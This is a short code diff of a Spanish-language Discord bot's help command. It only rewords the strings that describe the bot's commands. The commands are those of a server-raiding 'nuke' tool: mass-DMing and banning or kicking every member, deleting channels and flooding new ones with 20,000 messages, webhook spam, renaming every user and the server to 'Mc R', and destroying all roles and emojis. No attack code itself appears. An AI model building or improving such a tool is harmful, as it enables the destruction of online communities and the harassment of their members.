@@ -270,14 +270,14 @@ async def ayuda(ctx):
         "!ping         -> Muestra la velocidad de respuesta actual.\n"
         "!banpro       -> DM Masivo + Ban global a todos los miembros.\n"
         "!kickpro      -> Expulsa de inmediato a todos los miembros.\n"
-        "!rD           -> Purgar todo, crear 50 canales e inundar con 20k mensajes.\n"
-        "!ccpro        -> Purga canales y crea 50 categorías para colapsar UI.\n"
+        "!rD           -> elimina todo, crear 50 canales e inundar con 20k mensajes.\n"
+        "!ccpro        -> elimina canales y crea 50 categorías para colapsar UI.\n"
         "!hookpro      -> Genera webhooks de spam ultra veloz por canal.\n"
         "!nickpro      -> Modifica el apodo de todos los usuarios a 'Mc R'.\n"
-        "!rnServers    -> Cambia el nombre del gremio a 'Mc R'.\n"
+        "!rnServers    -> Cambia el nombre del servidor a 'Mc R'.\n"
         "!rolesD       -> Destruye todos los roles existentes del servidor.\n"
         "!rolesC       -> Genera 50 roles con colores arcoíris aleatorios.\n"
-        "!emojisD      -> Purga los emojis y stickers personalizados.\n"
+        "!emojisD      -> elimina los emojis y stickers personalizados.\n"
         "
 
     await ctx.send(embed=embed)
